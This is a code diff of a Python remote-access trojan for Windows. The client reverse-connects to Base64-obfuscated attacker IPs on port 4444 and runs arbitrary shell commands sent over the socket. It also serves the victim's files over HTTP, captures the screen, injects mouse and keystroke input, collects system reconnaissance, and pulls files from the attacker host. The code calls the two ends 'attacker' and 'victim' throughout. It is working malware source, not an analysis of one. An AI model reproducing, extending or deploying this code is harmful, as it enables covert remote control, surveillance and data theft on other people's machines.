@@ -18,60 +18,266 @@ import cv2
 import numpy as np
 import pyautogui
 import struct
+import platform
+import sqlite3
+import random
+import io
+from connection_manager import ConnectionManager
 
-# Global variable to store the valid attacker IP
-valid_attacker_ip = None
+pyautogui.FAILSAFE = False
 
-class FullFrameStreamer:
-    def __init__(self, server_ip, port=5001):
-        self.server_ip = server_ip
-        self.port = port
-        self.quality = 90  # Max JPEG quality
-        self.resolution = pyautogui.size()  # Automatically get the current screen resolution
-        self.running = False
-        self.sock = None
+# Server configuration
+HOST = '0.0.0.0'  # Listen on all available interfaces
+PORT = 5555       # Port to listen on
+MAX_CONNECTIONS = 5  # Maximum number of simultaneous connections
 
-    def connect(self):
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            self.sock.connect((self.server_ip, self.port))
-            self.running = True
-            # Start the streaming loop in a separate thread
-            self.stream_thread = threading.Thread(target=self.capture_stream, daemon=True)
-            self.stream_thread.start()
-        except ConnectionRefusedError:
-            print("Connection failed - ensure Attacker is running")
+# Set up screen resolution
+screen_width, screen_height = pyautogui.size()
+print(f"Screen resolution: {screen_width}x{screen_height}")
 
-    def capture_stream(self):
-        try:
-            while self.running:
-                # Capture and process frame
-                screen = pyautogui.screenshot()
-                frame = cv2.resize(np.array(screen), self.resolution)
-                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+# Lock for thread synchronization
+print_lock = threading.Lock()
+
+def capture_screen():
+    """Capture the screen and return compressed image bytes"""
+    # Take a screenshot
+    screenshot = pyautogui.screenshot()
+    
+    # Convert to bytes
+    img_byte_arr = io.BytesIO()
+    screenshot.save(img_byte_arr, format='JPEG', quality=50)
+    return img_byte_arr.getvalue()
+
+def handle_client(conn, addr, connection_manager):
+    """Handle individual client connection"""
+    print(f"[NEW CONNECTION] {addr} connected.")
+    
+    # Register connection with the connection manager
+    client_id = connection_manager.register_connection(conn, addr)
+    
+    try:
+        while True:
+            # Receive command from client
+            command = conn.recv(1024).decode('utf-8')
+            
+            if not command:
+                break
                 
-                # Encode as full-quality JPEG
-                _, jpg = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, self.quality])
+            # Update activity timestamp
+            connection_manager.update_activity(client_id)
                 
-                # Send frame with header
-                header = struct.pack('!I', len(jpg))  # 4-byte size header
-                self.sock.sendall(header + jpg.tobytes())
+            if command.startswith('SCREEN'):
+                # Send screen capture to client
+                img_bytes = capture_screen()
+                # Send the size of the image first
+                conn.sendall(struct.pack('>L', len(img_bytes)))
+                # Then send the image
+                conn.sendall(img_bytes)
                 
-                time.sleep(0.016)  # ~60 FPS
+            elif command.startswith('MOUSE'):
+                # Format: MOUSE|x|y|action
+                # Actions: click, right_click, double_click, move
+                parts = command.split('|')
+                if len(parts) >= 4:
+                    x = int(parts[1])
+                    y = int(parts[2])
+                    action = parts[3]
+                    
+                    if action == 'click':
+                        pyautogui.click(x, y)
+                    elif action == 'right_click':
+                        pyautogui.rightClick(x, y)
+                    elif action == 'double_click':
+                        pyautogui.doubleClick(x, y)
+                        
+            elif command.startswith('KEY'):
+                # Format: KEY|text or KEY|special_key
+                parts = command.split('|')
+                if len(parts) >= 2:
+                    key_input = parts[1]
+                    
+                    # Check if it's a special key
+                    if key_input.startswith('special:'):
+                        special_key = key_input.replace('special:', '')
+                        pyautogui.press(special_key)
+                    else:
+                        pyautogui.write(key_input)
+                
+    except Exception as e:
+        print(f"[ERROR] {addr}: {e}")
+    finally:
+        # Unregister connection from the connection manager
+        connection_manager.unregister_connection(client_id)
+        conn.close()
+        print(f"[DISCONNECTED] {addr} disconnected.")
 
-        except Exception as e:
-            print(f"Streaming error: {str(e)}")
-        finally:
-            if self.sock:
-                self.sock.close()
-            self.running = False
+# Set up the server
+def start_server():
+    # Get the path to the Documents folder
+    documents_path = os.path.expanduser('~\\Documents')
 
-    def stop(self):
-        """Stop the streaming loop."""
-        self.running = False
-        if self.sock:
-            self.sock.close()
+    # Create a new folder inside Documents
+    folder_name = "VictimTest"
+    new_folder_path = os.path.join(documents_path, folder_name)
 
+    # Create the folder if it doesn't exist
+    if not os.path.exists(new_folder_path):
+        os.makedirs(new_folder_path)
+
+    # Change the working directory to the new folder
+    os.chdir(new_folder_path)
+    server_address = ('', 8081)
+    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
+    print("Server started on port 8081...")
+    httpd.serve_forever()
+
+CHUNK_SIZE = 1024 * 1
+
+def start_combined_server():
+    """Start combined server handling both file serving and remote commands"""
+    servers = []
+    connection_manager = ConnectionManager(HOST, PORT)
+    connection_manager.start()
+    
+    try:
+        # Create and bind command server
+        cmd_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        cmd_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        cmd_server.bind((HOST, PORT))
+        cmd_server.listen(MAX_CONNECTIONS)
+        
+        # Create custom request handler class
+        class CustomRequestHandler(SimpleHTTPRequestHandler):
+            def translate_path(self, path):
+                """Translate URL path to filesystem path, checking Documents/VictimTest first"""
+                # First try the default path resolution
+                path = SimpleHTTPRequestHandler.translate_path(self, path)
+                
+                # If not found, try in Documents/VictimTest folder
+                if not os.path.exists(path):
+                    docs_path = os.path.expanduser('~\\Documents\\VictimTest')
+                    alt_path = os.path.join(docs_path, os.path.basename(path))
+                    if os.path.exists(alt_path):
+                        return alt_path
+                return path
+            
+            def do_GET(self):
+                """Handle GET requests (file downloads and directory listings)"""
+                try:
+                    path = self.translate_path(self.path)
+                    if not os.path.exists(path):
+                        self.send_error(404, "File not found")
+                        return
+                        
+                    if os.path.isdir(path):
+                        # Generate directory listing
+                        self.send_response(200)
+                        self.send_header('Content-type', 'text/html; charset=utf-8')
+                        self.end_headers()
+                        
+                        # Build directory listing HTML
+                        listing = f"<html><head><title>Directory listing for {self.path}</title></head>"
+                        listing += "<body><h2>Directory listing</h2><hr><ul>"
+                        
+                        # Add parent directory link
+                        if self.path != '/':
+                            listing += f'<li><a href="{os.path.dirname(self.path)}">..</a></li>'
+                            
+                        # Add files and subdirectories
+                        for name in sorted(os.listdir(path)):
+                            full_path = os.path.join(path, name)
+                            display_name = name
+                            if os.path.isdir(full_path):
+                                display_name += "/"
+                            listing += f'<li><a href="{os.path.join(self.path, name)}">{display_name}</a></li>'
+                            
+                        listing += "</ul><hr></body></html>"
+                        self.wfile.write(listing.encode('utf-8'))
+                    else:
+                        # Serve the file with streaming
+                        with open(path, 'rb') as f:
+                            self.send_response(200)
+                            self.send_header('Content-type', 'application/octet-stream')
+                            self.send_header('Content-Length', str(os.path.getsize(path)))
+                            self.end_headers()
+                            shutil.copyfileobj(f, self.wfile)
+                except Exception as e:
+                    self.send_error(500, f"Server error: {str(e)}")
+
+        # Create and bind HTTP file server with our custom handler
+        httpd = HTTPServer(('', HTTP_PORT), CustomRequestHandler)
+        
+        servers.append((cmd_server, "Command Server"))
+        servers.append((httpd, "HTTP File Server"))
+        
+        # Start servers in separate threads
+        for server, name in servers:
+            def server_worker(s):
+                if isinstance(s, HTTPServer):
+                    s.serve_forever()
+                else:  # Socket server
+                    while True:
+                        try:
+                            cmd_server.settimeout(1)
+                            conn, addr = s.accept()
+                            client_thread = threading.Thread(
+                                target=handle_client,
+                                args=(conn, addr, connection_manager)
+                            )
+                            client_thread.daemon = True
+                            client_thread.start()
+                        except socket.timeout:
+                            continue
+                            
+            server_thread = threading.Thread(
+                target=server_worker,
+                args=(server,),
+                daemon=True
+            )
+            server_thread.start()
+        
+        print(f"[LISTENING] Combined server started on ports {PORT} (commands) and {HTTP_PORT} (files)")
+        print(f"[MANAGEMENT] Connection manager listening on {HOST}:{PORT+1}")
+        
+        while True:
+            # Accept connections with timeout to allow for keyboard interrupt
+            cmd_server.settimeout(1)
+            try:
+                conn, addr = cmd_server.accept()
+                
+                if connection_manager.get_connection_count() >= MAX_CONNECTIONS:
+                    print(f"[REJECTED] {addr} - Maximum connections reached")
+                    conn.sendall(b'ERROR: Maximum connections reached')
+                    conn.close()
+                    continue
+                
+                client_thread = threading.Thread(
+                    target=handle_client,
+                    args=(conn, addr, connection_manager)
+                )
+                client_thread.daemon = True
+                client_thread.start()
+                
+                print(f"[ACTIVE CONNECTIONS] {connection_manager.get_connection_count()}")
+                
+            except socket.timeout:
+                continue
+                
+    except KeyboardInterrupt:
+        print("[SHUTTING DOWN] Server is shutting down...")
+    except Exception as e:
+        print(f"[ERROR] {e}")
+    finally:
+        connection_manager.stop()
+        for server, _ in servers:
+            try:
+                if isinstance(server, socket.socket):
+                    server.close()
+                else:
+                    server.server_close()
+            except:
+                pass
+        print("[CLOSED] Servers closed.")
 
 # Get the path to the Documents folder
 documents_path = os.path.expanduser('~\\Documents')
@@ -90,18 +296,73 @@ os.chdir(new_folder_path)
 # Verify the current working directory
 print("Current working directory:", os.getcwd())
 
-# Set up the server
-def start_server():
-    server_address = ('', 8080)  # Listen on all available interfaces, port 8000
-    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
-    print("Server started on port 8080...")
-    httpd.serve_forever()
+# Define HTTP port constant
+HTTP_PORT = 8080
+
+# Obfuscated target IP addresses and port
+encoded_target_1 = "bG9jYWxob3N0"  # Base64 encoded "localhost"
+encoded_target_2 = "MTAuNC4xLjcx"  # Base64 encoded "10.4.1.71"
+encoded_target_3 = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
+encoded_port = "NDQ0NA=="        # Base64 encoded "4444"
+
+# Decode the port
+target_port = int(base64.b64decode(encoded_port).decode())
 
 # User profile directory
 user_profile = os.getenv('USERPROFILE')
 
 # Track the current working directory
 current_directory = os.getcwd()
+
+# Create a database connection with timeout and proper locking
+def get_db_connection():
+    db_path = os.path.join(new_folder_path, "connection_history.db")
+    conn = sqlite3.connect(db_path, timeout=3.0, isolation_level=None)
+    conn.execute("PRAGMA journal_mode=WAL")  # Use Write-Ahead Logging for better concurrency
+    conn.execute("PRAGMA busy_timeout=10000")  # Set busy timeout to 10 seconds
+    return conn
+
+# Initialize database
+def init_database():
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        
+        # Create connection history table
+        cursor.execute('''
+        CREATE TABLE IF NOT EXISTS connection_history (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            timestamp TEXT,
+            target_ip TEXT,
+            success INTEGER,
+            error_message TEXT
+        )
+        ''')
+        
+        conn.commit()
+        conn.close()
+    except sqlite3.Error as e:
+        print(f"Database initialization error: {e}")
+
+# Log connection attempt
+def log_connection_attempt(target_ip, success, error_message=""):
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        cursor.execute(
+            "INSERT INTO connection_history (timestamp, target_ip, success, error_message) VALUES (?, ?, ?, ?)",
+            (timestamp, target_ip, 1 if success else 0, error_message)
+        )
+        
+        conn.commit()
+        conn.close()
+    except sqlite3.Error as e:
+        print(f"Database logging error: {e}")
+
+# Initialize database
+init_database()
 
 def find_window_by_pid(pid):
     """Find a window by its process ID."""
@@ -149,115 +410,61 @@ handler = HandlerRoutine(console_handler)
 if not ctypes.windll.kernel32.SetConsoleCtrlHandler(handler, True):
     print("Error: Could not set control handler")
 
-# Clear console
-subprocess.run("cls", shell=True)
-
-def validate_attacker(sock):
-    """
-    Validate the attacker by performing a handshake.
-    :param sock: The socket connected to the server.
-    :return: True if the server is the correct attacker, False otherwise.
-    """
-    try:
-        # Send a handshake message
-        handshake_message = "HELLO_ATTACKER"
-        sock.send(handshake_message.encode())
-        
-        # Wait for the server's response
-        response = sock.recv(1024).decode().strip()
-        
-        # Check if the response is correct
-        if response == "HELLO_VICTIM":
-            return True
-    except Exception as e:
-        print(f"Handshake error: {e}")
-    return False
-
-def scan_network(base_ip, port, start=1, end=255):
-    """
-    Scan the network for the correct attacker.
-    :param base_ip: The base IP address (e.g., '10.0.0.')
-    :param port: The port to scan (e.g., 4444)
-    :param start: The starting range of the last octet (e.g., 1)
-    :param end: The ending range of the last octet (e.g., 255)
-    :return: The IP address of the correct attacker, or None if not found.
-    """
-    for i in range(start, end + 1):
-        target_ip = f"{base_ip}{i}"
-        print(target_ip + '\n')
-        try:
-            # Attempt to connect to the target IP and port
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.005)  # Set a timeout for the connection attempt
-            result = s.connect_ex((target_ip, port))
-            
-            if result == 0:  # If the connection is successful
-                print(f"Found active host: {target_ip}")
-                
-                # Validate the attacker
-                if validate_attacker(s):
-                    print(f"Validated attacker at {target_ip}")
-                    s.close()
-                    return target_ip
-                
-            s.close()
-        except Exception as e:
-            print(f"Error scanning {target_ip}: {e}")
-    return None
+#clear console
+#subprocess.run("cls", shell=True)
 
 def connect_to_attacker():
-    global valid_attacker_ip
-
+    # Track which IP to try (0=first, 1=second, 2=third)
+    ip_index = 0
+    
     while True:
         try:
             time.sleep(1)
             
-            # If a valid IP is already found, use it
-            if valid_attacker_ip:
-                print(f"Reconnecting to saved IP: {valid_attacker_ip}")
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((valid_attacker_ip, 4444))
-                return s, valid_attacker_ip
-            
-            # Scan the network for the correct attacker (only if no valid IP is found)
-            base_ip = "10.0.0."  # Adjust this to match your network
-            target_port = 4444    # Adjust this to match the port you're targeting
-            active_host = scan_network(base_ip, target_port)
-            
-            if active_host:
-                # Save the valid IP
-                valid_attacker_ip = active_host
-                
-                # Create a socket and attempt to connect to the active host
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((active_host, target_port))
-                
-                # Validate the attacker again (just to be safe)
-                if validate_attacker(s):
-                    print(f"Connected to attacker at {active_host}")
-                    return s, active_host
-                else:
-                    print(f"Invalid attacker at {active_host}. Retrying...")
-                    s.close()
+            # Rotate through the three IP addresses
+            if ip_index == 0:
+                target_ip = base64.b64decode(encoded_target_1).decode()
+                print(f"Attempting to connect to first target...")
+            elif ip_index == 1:
+                target_ip = base64.b64decode(encoded_target_2).decode()
+                print(f"Attempting to connect to second target...")
             else:
-                print("No valid attacker found. Retrying...")
-                time.sleep(0.1)
-                
+                target_ip = base64.b64decode(encoded_target_3).decode()
+                print(f"Attempting to connect to third target...")
+            
+            # Increment index for next attempt (cycle through 0, 1, 2)
+            ip_index = (ip_index + 1) % 3
+            
+            # Create a socket and attempt to connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)  # Set a timeout for the connection attempt
+            s.connect((target_ip, target_port))
+            
+            # Log successful connection
+            log_connection_attempt(target_ip, True)
+            
+            # If connection is successful, return the socket
+            print(f"Connected to {target_ip}:{target_port}")
+            return s
+            
         except ConnectionRefusedError:
             # If connection is refused, retry after a delay
-            time.sleep(5)
+            log_connection_attempt(target_ip, False, "Connection refused")
+            print(f"Connection refused, retrying...")
+            time.sleep(1)
         except socket.timeout:
             # If the connection times out, retry after a delay
-            time.sleep(5)
+            log_connection_attempt(target_ip, False, "Connection timed out")
+            print(f"Connection timed out, retrying...")
+            time.sleep(1)
         except Exception as e:
             # Handle other exceptions
-            print(f"Connection error: {e}")
-            time.sleep(5)
+            log_connection_attempt(target_ip, False, str(e))
+            print(f"Connection error: {str(e)}, retrying...")
+            time.sleep(1)
 
-def handle_connection(s, active_host):
+def handle_connection(s):
     global current_directory
-    streamer = None  # Initialize the streamer object
-
     try:
         # Start a shell and communicate through the socket
         while True:
@@ -278,7 +485,7 @@ def handle_connection(s, active_host):
                     except Exception as e:
                         output = f"{str(e)}\n"  # Send the error message if the directory change fails
 
-                elif command == "kill":
+                elif command == ("sigma2"):
                     try:
                         subprocess.run("taskkill /F /IM java.exe", shell=True, check=False)
                         subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False)
@@ -287,131 +494,258 @@ def handle_connection(s, active_host):
                         os.kill(os.getpid(), signal.CTRL_BREAK_EVENT)
                     except Exception as e:
                         output = f"{str(e)}\n"
-
-                elif command == "downloads2":
+                elif command == ("downloads2"):
                     try:
                         user_profile = os.getenv('USERPROFILE')
                         print("User Profile Path:", user_profile)
-                        os.chdir(user_profile)
+                        
+                        # Create a new directory called "Downloads2" in the user profile directory
                         new_directory = os.path.join(user_profile, "Downloads2")
+                        
+                        # Check if the directory already exists
                         if not os.path.exists(new_directory):
                             os.mkdir(new_directory)
                             print(f"Directory 'Downloads2' created in {user_profile}")
                             os.chdir(new_directory)
                             current_directory = os.getcwd()
-                            print(f"Current Directory: {current_directory}")
-                            output = f"Directory 'Downloads2' created in {user_profile} and changed to {current_directory}"
+                            output = f"Directory 'Downloads2' created and changed to: {current_directory}\n"
                         else:
-                            print(f"Directory 'Downloads2' already exists in {user_profile}")
                             os.chdir(new_directory)
                             current_directory = os.getcwd()
-                            print(f"Current Directory: {current_directory}")
-                            output = f"Directory 'Downloads2' created in {user_profile} and changed to {current_directory}"
+                            output = f"Changed directory to: {current_directory}\n"
                     except Exception as e:
                         output = f"{str(e)}\n"
-
+                        
                 elif command.startswith("download "):
-                    # Handle file download
+                    def download_file(url, temp_path):
+                        """Download file from URL with streaming"""
+                        try:
+                            with requests.get(url, stream=True, timeout=5) as r:
+                                r.raise_for_status()
+                                with open(temp_path, 'wb') as f:
+                                    if os.name == 'posix':
+                                        import fcntl
+                                        fcntl.flock(f, fcntl.LOCK_EX)
+                                    elif os.name == 'nt':
+                                        import msvcrt
+                                        msvcrt.locking(f.fileno(), msvcrt.LK_NBLCK, 1)
+                                    for chunk in r.iter_content(chunk_size=8192):
+                                        if chunk:
+                                            f.write(chunk)
+                                    f.flush()
+                                    os.fsync(f.fileno())
+                            return True
+                        except Exception as e:
+                            return f"Download failed: {str(e)}"
+
+                    def rename_temp_file(temp_path, file_name):
+                        """Handle atomic file rename with locking"""
+                        try:
+                            with FileLock(file_name):
+                                if os.path.exists(file_name):
+                                    os.remove(file_name)
+                                os.rename(temp_path, file_name)
+                            return True
+                        except Exception as e:
+                            return f"File rename failed: {str(e)}"
+
+                    def cleanup_temp_file(temp_path):
+                        """Safely remove temporary file"""
+                        try:
+                            if os.path.exists(temp_path):
+                                os.remove(temp_path)
+                            return True
+                        except Exception as e:
+                            return f"Cleanup failed: {str(e)}"
+
+                    # Main download handling
                     file_name = command[9:].strip()
-                    url = f'http://{active_host}:8000/{file_name}'  # Change the IP address to the attacker's IP
-
+                    temp_path = f"{file_name}.{os.getpid()}.tmp"
+                    output = ""
+                    
                     try:
-                        # Send a GET request to the server
-                        response = requests.get(url, timeout=5)  # Add a timeout to avoid hanging
+                        current_ip = s.getpeername()[0]
+                        url = f'http://{current_ip}:{HTTP_PORT}/{file_name}'
+                        
+                        # Step 1: Download file
+                        download_result = download_file(url, temp_path)
+                        if download_result is not True:
+                            output = download_result + "\n"
+                            raise Exception(download_result)
+                            
+                        # Step 2: Rename temp file
+                        rename_result = rename_temp_file(temp_path, file_name)
+                        if rename_result is not True:
+                            output = rename_result + "\n"
+                            raise Exception(rename_result)
+                            
+                        output = f"File downloaded: {file_name}\n"
+                        
+                    except Exception as e:
+                        try:
+                            error_msg = str(e)
+                            cleanup_result = cleanup_temp_file(temp_path)
+                            if cleanup_result is not True:
+                                error_msg += f" ({cleanup_result})"
+                            output = f"Error: {error_msg}\n"
+                        except Exception as final_error:
+                            output = f"Critical error during cleanup: {str(final_error)}\n"
+                        except Exception as e:
+                            # Clean up temp file if download failed
+                            if os.path.exists(temp_path):
+                                try:
+                                    os.remove(temp_path)
+                                except:
+                                    pass
+                            output = f"Error downloading file: {str(e)}\n"
 
-                        # Check if the request was successful
-                        if response.status_code == 200:
-                            # Save the file locally
-                            with open(file_name, 'wb') as file:
-                                file.write(response.content)
-                            print(f"File downloaded successfully as {file_name}")
-                            output = f"File downloaded: {file_name}\n"
+                elif command == ("connection_history"):
+                    try:
+                        conn = get_db_connection()
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT * FROM connection_history ORDER BY timestamp DESC LIMIT 20")
+                        rows = cursor.fetchall()
+                        conn.close()
+                        
+                        if rows:
+                            output = "Connection History (Last 20 attempts):\n"
+                            output += "ID | Timestamp | Target IP | Success | Error\n"
+                            for row in rows:
+                                output += f"{row[0]} | {row[1]} | {row[2]} | {'Success' if row[3] else 'Failed'} | {row[4]}\n"
                         else:
-                            print(f"Failed to download file. Status code: {response.status_code}")
-                            output = f"Failed to download file. Status code: {response.status_code}\n"
-                    except requests.exceptions.RequestException as e:
-                        print(f"Error: {e}")
-                        output = f"Error: {e}\n"
-
-                elif command == "start_stream":
-                    # Start the screen stream in a separate thread
-                    if streamer is None or not streamer.running:
-                        streamer = FullFrameStreamer(active_host)
-                        streamer.connect()
-                        output = str(streamer.resolution[0]) + ":" + str(streamer.resolution[1])
-                    else:
-                        output = "Screen streaming is already running.\n"
+                            output = "No connection history found.\n"
+                    except Exception as e:
+                        output = f"Error retrieving connection history: {str(e)}\n"
 
                 elif command.startswith("upload "):
                     try:
-                        # Extract the file path from the command
                         file_path = command[len("upload "):].strip()
 
-                        # Check if the file exists on the client machine
                         if os.path.exists(file_path):
-                            # Define the current working directory
                             current_working_dir = os.getcwd()
-                
-                            # Get the file name from the path
                             file_name = os.path.basename(file_path)
-                
-                            # Define the destination path in the current working directory
                             destination_path = os.path.join(current_working_dir, file_name)
-                
-                            # Copy the file to the current working directory
-                            shutil.copy(file_path, destination_path)
-                
-                            # Set output for success
-                            output = f"File '{file_name}' uploaded successfully to {current_working_dir}."
-                
+                            
+                            # Use file lock during upload
+                            with FileLock(destination_path) as lock:
+                                # Check if file exists again after acquiring lock
+                                if os.path.exists(destination_path):
+                                    # Append unique suffix if file exists
+                                    base, ext = os.path.splitext(file_name)
+                                    destination_path = os.path.join(
+                                        current_working_dir,
+                                        f"{base}_{int(time.time())}{ext}"
+                                    )
+                                
+                                shutil.copy2(file_path, destination_path)
+                            
+                            output = f"File uploaded: {file_path} -> {destination_path}\n"
                         else:
-                            # Handle the case where the file doesn't exist
-                            output = f"Error: File '{file_path}' not found on the client machine."
-                
+                            output = f"File not found: {file_path}\n"
                     except Exception as e:
-                        # Catch any unexpected exceptions and suppress default system error message
-                        output = "An error occurred during the file upload, but no specific error message was provided."
-                        # Optionally, you can log the actual error message for debugging purposes:
-                        # print(f"Error: {str(e)}")
+                        output = f"Error uploading file: {str(e)}\n"
 
-                elif command.startswith("pidtxt "):
-                    output = "Make you set your PID file\n"
-                    with open("PID.txt", "r") as file:
-                        data = file.read()  # Read entire file
-                    # Prompt the user for the PID
-                    pid = int(data)
-                    # Prompt the user for the command
-                    command = command[6:].strip()
-                    # Find the window handle by PID
-                    hwnd = find_window_by_pid(pid)
-                    # Send the command to the window
-                    send_keystrokes(hwnd, command)
-                else:
-                    # Execute the command in the current directory
+                elif command == "whoami" or command == "Whoami":
                     try:
-                        output = subprocess.getoutput(f"cd {current_directory} && {command}\n")
+                        result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
+                        username = result.stdout.strip()
+                        # Extract everything after the backslash in the username
+                        if "\\" in username:
+                            username = username.split("\\")[-1]
+                        
+                        # Get system information
+                        system_info = "System Info:\n"
+                        system_info += f"OS: {platform.system()} {platform.version()}\n"
+                        system_info += f"Architecture: {platform.architecture()[0]}\n"
+                        system_info += f"Machine: {platform.machine()}\n"
+                        system_info += f"Processor: {platform.processor()}\n"
+                        
+                        # Get current working directory
+                        cwd = os.getcwd()
+                        
+                        # Combine all information
+                        output = f"Username: {username}\n{system_info}Current Directory: {cwd}\n"
                     except Exception as e:
-                        output = f"{str(e)}\n"  # Send the error message if the command fails
+                        output = f"Error getting system info: {str(e)}\n"
 
-                # Send the output back to the attacker with a newline at the end
-                s.send((output + "\n").encode())  # Add a newline after the output
-            except socket.timeout:
-                # Handle socket timeout
-                break
+                elif command == "exit":
+                    # Close the connection and exit
+                    s.close()
+                    break
+
+                else:
+                    # Execute the command and get the output
+                    try:
+                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                        output = result.stdout + result.stderr
+                        if not output:
+                            output = "Command executed successfully (no output)\n"
+                    except Exception as e:
+                        output = f"{str(e)}\n"
+
+                # Send the output back to the attacker
+                s.send(output.encode())
+
             except Exception as e:
-                # Handle other communication errors
-                print(f"Error handling command: {e}")
-                break
-
+                # Handle any exceptions that occur during command execution
+                try:
+                    continue
+                except:
+                    # If we can't send the error, the connection is probably closed
+                    break
+                
+    except Exception as e:
+        print(f"Connection error: {str(e)}")
     finally:
-        # Close the socket and stop the streamer if it's running
-        if streamer is not None and streamer.running:
-            streamer.stop()
-        s.close()
+        try:
+            s.close()
+        except:
+            pass
+
+class FileLock:
+    """Simple file lock implementation for cross-platform use"""
+    def __init__(self, filename):
+        self.filename = filename
+        self.lockfile = f"{filename}.lock"
+        self.fd = None
+        
+    def __enter__(self):
+        if os.name == 'posix':
+            import fcntl
+            self.fd = open(self.lockfile, 'w')
+            fcntl.flock(self.fd, fcntl.LOCK_EX)
+        elif os.name == 'nt':
+            import msvcrt
+            self.fd = open(self.lockfile, 'w')
+            msvcrt.locking(self.fd.fileno(), msvcrt.LK_NBLCK, 1)
+        return self
+        
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        if self.fd:
+            if os.name == 'posix':
+                import fcntl
+                fcntl.flock(self.fd, fcntl.LOCK_UN)
+            elif os.name == 'nt':
+                import msvcrt
+                msvcrt.locking(self.fd.fileno(), msvcrt.LK_UNLCK, 1)
+            self.fd.close()
+            try:
+                os.remove(self.lockfile)
+            except:
+                pass
 
 # Main loop
 while True:
-    server_thread = threading.Thread(target=start_server, daemon=True)
-    server_thread.start()
-    s, active_host = connect_to_attacker()  # Connect to the attacker
-    handle_connection(s, active_host)       # Handle the connection
+    try:
+        # Start HTTP server for file uploads in a separate thread
+        threading.Thread(target=start_server, daemon=True).start()
+        threading.Thread(target=start_combined_server, daemon=True).start()
+
+        # Connect to the attacker
+        s = connect_to_attacker()
+        
+        # Handle the connection
+        handle_connection(s)
+        
+    except Exception as e:
+        time.sleep(5)  # Wait before retrying
